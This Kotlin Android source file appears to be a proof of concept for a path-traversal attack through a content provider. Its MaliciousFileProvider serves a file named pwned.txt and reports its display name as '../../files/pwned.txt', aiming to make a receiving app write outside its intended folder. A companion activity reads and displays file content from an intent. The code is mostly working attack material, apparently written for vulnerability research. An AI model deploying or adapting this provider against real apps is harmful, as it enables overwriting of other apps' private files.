package com.example.myapplication2

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.Bundle
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import com.example.myapplication2.ui.theme.MyApplicationTheme
import java.io.File
import java.io.FileNotFoundException
import java.io.FileOutputStream
import java.io.InputStreamReader

class FileReceiverActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val uri: Uri? = intent.data
        var fileContent = "Could not read file content."

        if (uri != null) {
            try {
                val inputStream = contentResolver.openInputStream(uri)
                val reader = InputStreamReader(inputStream).buffered()
                fileContent = reader.readText()
                inputStream?.close()
            } catch (e: Exception) {
                fileContent = "Error reading file: ${e.message}"
            }
        }

        setContent {
            MyApplicationTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Box(modifier = Modifier.padding(16.dp), contentAlignment = Alignment.Center) {
                        LazyColumn {
                            item { Text(text = fileContent) }
                        }
                    }
                }
            }
        }
    }
}

class MaliciousFileProvider : ContentProvider() {

    private val FILE_NAME = "pwned.txt"

    override fun onCreate(): Boolean {
        val file = File(context?.cacheDir, FILE_NAME)
        if (!file.exists()) {
            try {
                FileOutputStream(file).use { fos ->
                    fos.write("PoC Successful!".toByteArray())
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor? {
        val columns = projection ?: arrayOf(OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE)
        val cursor = MatrixCursor(columns)
        val file = File(context?.cacheDir, FILE_NAME)
        cursor.newRow().add(OpenableColumns.DISPLAY_NAME, "../../files/pwned.txt").add(OpenableColumns.SIZE, file.length())
        return cursor
    }

    override fun getType(uri: Uri): String? {
        return "*/*"
    }

    override fun insert(uri: Uri, values: ContentValues?): Uri? {
        return null
    }

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int {
        return 0
    }

    override fun update(
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<String>?
    ): Int {
        return 0
    }

    @Throws(FileNotFoundException::class)
    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        val file = File(context?.cacheDir, FILE_NAME)
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY)
    }
}
